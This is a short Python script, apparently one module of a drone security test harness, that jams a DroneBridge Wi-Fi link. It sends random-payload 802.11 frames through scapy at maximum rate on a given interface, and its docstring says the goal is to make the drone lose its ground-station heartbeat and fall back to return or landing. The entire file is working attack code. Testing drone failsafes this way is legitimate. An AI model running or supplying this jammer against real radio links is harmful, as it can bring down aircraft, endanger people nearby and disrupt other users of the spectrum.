#!/usr/bin/env python3
"""
T6/T19 RF Jamming — Flood the DroneBridge channel with garbage frames.

Sends random-payload 802.11 frames via wlan2 at maximum rate.
Expected drone behavior: GCS heartbeat loss → RC failsafe → RTL or LAND.

Usage (standalone test):
    sudo python3 rf_jamming.py --interface wlan2
    
Normally started/stopped by the orchestrator.
"""

import argparse
import signal
import time
import os

keep_running = True


def handle_signal(sig, frame):
    global keep_running
    keep_running = False


def run_jamming(interface: str):
    from scapy.all import RadioTap, sendp, Raw
    import random

    frame_count = 0
    while keep_running:
        # Random payload, random length 64-1500 bytes
        payload = os.urandom(random.randint(64, 1500))
        frame = RadioTap() / Raw(load=payload)
        sendp(frame, iface=interface, verbose=False, count=1)
        frame_count += 1

        if frame_count % 1000 == 0:
            print(f"[RF_JAM] {frame_count} frames sent", flush=True)

    print(f"[RF_JAM] Stopped. Total frames: {frame_count}", flush=True)


def main():
    parser = argparse.ArgumentParser(description="T6/T19 RF Jamming")
    parser.add_argument("--interface", default="wlan2")
    parser.add_argument("--mission-id", default="manual")
    args = parser.parse_args()

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    print(f"[RF_JAM] Starting on {args.interface}", flush=True)
    run_jamming(args.interface)


if __name__ == "__main__":
    main()